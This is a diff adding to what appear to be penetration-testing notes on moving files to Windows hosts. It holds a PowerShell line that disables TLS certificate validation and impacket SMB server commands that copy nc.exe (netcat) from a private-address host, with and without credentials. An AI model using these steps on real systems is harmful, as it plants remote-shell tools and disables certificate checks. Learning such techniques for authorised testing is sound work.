@@ -15,3 +15,20 @@
 
 > Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:  
 > `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`
+
+# With SMB
+
+create server
+`impacket-smbserver -smb2support share .`
+
+transfer  
+`copy \\192.168.220.133\share\nc.exe`
+
+New versions of Windows block unauthenticated guest access  
+
+Create the SMB Server with a Username and Password  
+`impacket-smbserver -smb2support share  . -user test -password test`  
+
+Mount the SMB Server with Username and Password  
+`net use n: \\192.168.220.133\share /user:test test`  
+`copy n:\nc.exe`
